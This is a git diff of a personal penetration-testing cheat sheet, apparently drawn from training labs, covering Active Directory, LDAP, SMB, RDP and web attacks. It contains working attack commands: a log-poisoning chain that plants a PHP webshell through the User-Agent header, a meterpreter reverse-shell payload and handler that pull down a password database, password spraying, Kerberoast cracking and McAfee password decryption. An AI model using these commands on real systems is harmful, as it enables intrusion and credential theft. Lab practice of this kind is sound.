@@ -1,5 +1,6 @@
 # TOC
 - [Tools](#tools)
+- [URLs](#urls)
 - [Training](#training)
 - [OSINT](#osint)
 - [setup](#setup)
@@ -17,6 +18,8 @@
 - [Responser](#responder)
 - [ffuf](#ffuf)
 - [nc](#nc)
+- [netstat](#netstat)
+- [ss](#ss)
 - [Windows Built-In](#windows-built-in)
 - [Powerview](#powerview)
 - [Metasploit](#metasploit)
@@ -39,6 +42,36 @@ https://github.com/wavestone-cdt/powerpxe/tree/master
 https://www.riskinsight-wavestone.com/en/2020/01/taking-over-windows-workstations-pxe-laps/  
 https://github.com/cube0x0/CVE-2021-1675/tree/main  
 https://pypi.org/project/requests-ntlm/  
+
+# URLs
+https://zsh-prompt-generator.site/
+https://bash-prompt-generator.org/
+
+- shell
+https://explainshell.com/
+
+- Windows Server Core
+https://learn.microsoft.com/ja-jp/windows-server/administration/server-core/what-is-server-core
+
+- Get-Service
+https://learn.microsoft.com/ja-jp/powershell/module/microsoft.powershell.management/get-service?view=powershell-7.4
+
+- vnstat command
+https://humdi.net/vnstat/
+
+- EyeWitness
+EyeWitness is designed to take screenshots of websites provide some server header info, and identify default credentials if known.
+https://github.com/RedSiege/EyeWitness
+https://www.christophertruncer.com/eyewitness-2-0-release-and-user-guide/
+
+- DREAD_(risk_assessment_model)
+https://en.wikipedia.org/wiki/DREAD_(risk_assessment_model)
+
+- Nessus Attack Scripting Language
+https://en.wikipedia.org/wiki/Nessus_Attack_Scripting_Language
+
+- Filesystem Hierarchy Standard (FHS)
+https://www.pathname.com/fhs/
 
 ---
 
@@ -97,12 +130,14 @@ $ hashcat -m 13100 ./SAPService_tgs /usr/share/wordlists/rockyou.txt
 tag: Misc
 
 # xfreerdp
+tag: RDP
 ```
 $ xfreerdp /v:XXX.XXX.XXX.XXX /u:TestUser /p:TestPassword /dynamic-resolution +clipboard
 ```
 `/dynamic-resolution` option may not work well.
 
 # Remmina
+tag: RDP
 ```zsh
 $ remmina -c rdp://TestUser@XXX.XXX.XXX.XXX
 ```
@@ -157,16 +192,32 @@ $ sudo responder -I ens224 -A
 $ sudo responder -I ens224
 ```
 
-# ffuf
+# ffuf  
 ```zsh
 $ ffuf -w -u http://XXX.XXX.XXX.XXX:RPORT/hoge/index.php?log=FUZZ
 ```
 
-# nc
+# nc  
 tag: LDAP Pass-back Attacks
 ```zsh
 $ sudo nc -lvnp LPORT
 $ nc -lvp 389
+```
+
+# netstat  
+```zsh
+$ netstat -tuln
+```
+
+# ss  
+```zsh
+$ ss -tuln
+$ ss -tuln4 | grep LISTEN | grep -v 127.0.0.1 | wc -l
+-t: Show TCP connections.
+-u: Show UDP connections.
+-l: Show only listening sockets.
+-n: Show numerical addresses instead of resolving hostnames.
+-4: IPv4
 ```
 
 # Windows Built-In
@@ -245,6 +296,7 @@ PS> Get-ADGroup -Identity "Enterprise Admins" -Properties * | Out-String | Selec
 PS> $Password = ConvertTo-SecureString "NewTestPassword" -AsPlainText -Force
 PS> Set-ADAccountPassword -Identity "TargetUser" -Reset -NewPassword $Password
 ```
+
 ## sc.exe
 ```powershell
 PS> sc.exe \\TestHost/HOGE.com create TestService binPath= "%windir%\TestService.exe" start= auto
@@ -317,22 +369,6 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.50.31.110 LPORT=443 -f 
 sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.50.31.110; set LPORT 443; exploit"
 #
 download C:\\Users\\t1_trevor.jones\\Documents\\PasswordDatabase.kdbx /root
-```
-
-# Memo
-```zsh
-$ http://XXX.XXX.XXX.XXX:RPORT/index.php?page=php://filter/read=convert.base64-encode/resource=index
-$ echo "~~~" | base64 -d | grep ".php"
-# access to : hoge/index.php"
-$ ffuf -w -u http://XXX.XXX.XXX.XXX:RPORT/hoge/index.php?log=FUZZ
-# access to : http://XXX.XXX.XXX.XXX:RPORT/hoge/index.php?log=../../../../../../var/log/nginx/access.log
-$ curl -s "http://XXX.XXX.XXX.XXX:RPORT/index.php" -A '<?php system($_GET["cmd"]); ?>'
-# access to : http://XXX.XXX.XXX.XXX:RPORT/hoge/index.php?log=../../../../../../var/log/nginx/access.log&cmd=id
-# access to : http://XXX.XXX.XXX.XXX:RPORT/hoge/index.php?log=../../../../../../var/log/nginx/access.log
-# php file
-## <?php system($_GET["cmd"]); ?>
-# User-Agent: <?php system($_GET['cmd']); ?>
-$ curl -X POST 'http://XXX.XXX.XXX.XXX:8080/webshell/api' --data "action=exec&cmd=id" 
 ```
 
 
@@ -451,42 +487,12 @@ icacls $sharedFolderPath /grant "${securityGroupName}:(OI)(CI)M", "${securityGro
 $subFolderPath = 'C:\Users\htb-student\Company Data\HR'; $securityGroupName = 'HR'; icacls $subFolderPath /remove "Users"; icacls $subFolderPath /inheritance:r; icacls $subFolderPath /grant "${securityGroupName}:(OI)(CI)M", "${securityGroupName}:(OI)(CI)RX", "${securityGroupName}:(OI)(CI)R", "${securityGroupName}:(OI)(CI)W"
 
 
-
-
-
-# URL
-https://zsh-prompt-generator.site/
-https://bash-prompt-generator.org/
-
-- shell
-https://explainshell.com/
-
-- Windows Server Core
-https://learn.microsoft.com/ja-jp/windows-server/administration/server-core/what-is-server-core
-
-- Get-Service
-https://learn.microsoft.com/ja-jp/powershell/module/microsoft.powershell.management/get-service?view=powershell-7.4
-
-- vnstat command
-https://humdi.net/vnstat/
-
-- EyeWitness
-EyeWitness is designed to take screenshots of websites provide some server header info, and identify default credentials if known.
-https://github.com/RedSiege/EyeWitness
-https://www.christophertruncer.com/eyewitness-2-0-release-and-user-guide/
-
-- DREAD_(risk_assessment_model)
-https://en.wikipedia.org/wiki/DREAD_(risk_assessment_model)
-
-- Nessus Attack Scripting Language
-https://en.wikipedia.org/wiki/Nessus_Attack_Scripting_Language
-
-- Filesystem Hierarchy Standard (FHS)
-https://www.pathname.com/fhs/
-
-
 # Linux Buit-In
 ```zsh
+# check service
+$ systemctl list-units --type=service
+$ systemctl show -p Type syslog.service
+#
 $ cat /etc/passwd | grep -v "false\|nologin" | cut -d":" -f1
 # find index number - inode
 $ stat sudoers
@@ -507,31 +513,8 @@ $ cat /etc/passwd | grep -v "false\|nologin" | tr ":" " " | column -t
 root         x  0     0      root               /root        /bin/bash
 sync         x  4     65534  sync               /bin         /bin/sync
 mrb3n        x  1000  1000   mrb3n              /home/mrb3n  /bin/bash
-
-
 ```
 
-# netstat and ss
-```
-$ netstat -tuln
-$ ss -tuln
-$ ss -tuln4 | grep LISTEN | grep -v 127.0.0.1 | wc -l
-
--t: Show TCP connections.
--u: Show UDP connections.
--l: Show only listening sockets.
--n: Show numerical addresses instead of resolving hostnames.
--4: IPv4
-```
-
-```
-$ systemctl list-units --type=service
-```
-
-What is the type of the service of the "syslog.service"?
-As for the type of service, systemd categorizes services into different types, such as "simple," "forking," "oneshot," "dbus," etc. The type of the "syslog.service" would depend on how the syslog daemon is managed by systemd.
-
-systemctl show -p Type syslog.service
 
 
 # Internal Password Spraying - from Windows
@@ -539,16 +522,18 @@ PS > Import-Module .\DomainPasswordSpray.ps1
 PS > Invoke-DomainPasswordSpray -Password Winter2022 -OutFile spray_success -ErrorAction SilentlyContinue
 
 
-
 # BloodHound  
 ```powershell
-PS> .\SharpHound.exe -c All --zipfilename hoge
 PS> BloodHound.exe
 # On GUI
 ## Upload Data ... zip file
 ## Check ... Analysis Tab
 ```
-
+## SharpHound
+```powershell
+PS> .\SharpHound.exe -c All --zipfilename hoge
+PS> .\SharpHound.exe --CollectionMethods All --Domain HOGE.com --ExcludeDCs
+```
 
 # Snaffer  
 tag: scan
@@ -563,7 +548,6 @@ PS> dsquery * -filter "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.
 PS> dsquery * -filter "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))" -attr description
 PS> dsquery * domainroot -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2)(adminCount=1))" -attr description
 ```
-
 
 # Samba
 ## smbclient
@@ -658,9 +642,6 @@ SpoolSample.exe THMSERVER2.za.tryhackme.loc "10.200.83.201"
 $ $ChangeDate = New-Object DateTime(2022, 02, 28, 12, 00, 00)
 $ Get-ADObject -Filter 'whenChanged -gt $ChangeDate' -includeDeletedObjects -Server za.tryhackme.com
 
-
-# SharpHound
-SharpHound.exe --CollectionMethods All --Domain HOGE.com --ExcludeDCs
 
 # LDAP Pass-back Attacks
 ```zsh
@@ -761,11 +742,13 @@ $ cat my_output.json
 ```
 
 # ldapsearch
+tag: LDAP
 ```zsh
 $ ldapsearch -h 172.16.0.10 -x -b "DC=HOGE,DC=COM" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
 ```
 
 # windapsearch
+tag: LDAP
 ```zsh
 $ ./windapsearch.py -h
 $ ./windapsearch.py --dc-ip 172.16.0.10 -u "" -U
@@ -778,3 +761,32 @@ $ git clone https://github.com/Ridter/noPac
 ```
 
 # SharpGPOAbuse
+
+# mcafee-sitelist-pwd-decryption
+tag: mcafee
+python3 version is released.
+https://github.com/funoverip/mcafee-sitelist-pwd-decryption
+```zsh
+$ mcafee_sitelist_pwd_decrypt.py TestMcafeeCryptedPassword
+```
+
+# Memo
+```
+C:/ProgramDara/McAfee/Agent/DB/ma.db
+```
+
+# Story
+```zsh
+$ http://XXX.XXX.XXX.XXX:RPORT/index.php?page=php://filter/read=convert.base64-encode/resource=index
+$ echo "~~~" | base64 -d | grep ".php"
+# access to : hoge/index.php"
+$ ffuf -w -u http://XXX.XXX.XXX.XXX:RPORT/hoge/index.php?log=FUZZ
+# access to : http://XXX.XXX.XXX.XXX:RPORT/hoge/index.php?log=../../../../../../var/log/nginx/access.log
+$ curl -s "http://XXX.XXX.XXX.XXX:RPORT/index.php" -A '<?php system($_GET["cmd"]); ?>'
+# access to : http://XXX.XXX.XXX.XXX:RPORT/hoge/index.php?log=../../../../../../var/log/nginx/access.log&cmd=id
+# access to : http://XXX.XXX.XXX.XXX:RPORT/hoge/index.php?log=../../../../../../var/log/nginx/access.log
+# php file
+## <?php system($_GET["cmd"]); ?>
+# User-Agent: <?php system($_GET['cmd']); ?>
+$ curl -X POST 'http://XXX.XXX.XXX.XXX:8080/webshell/api' --data "action=exec&cmd=id" 
+```
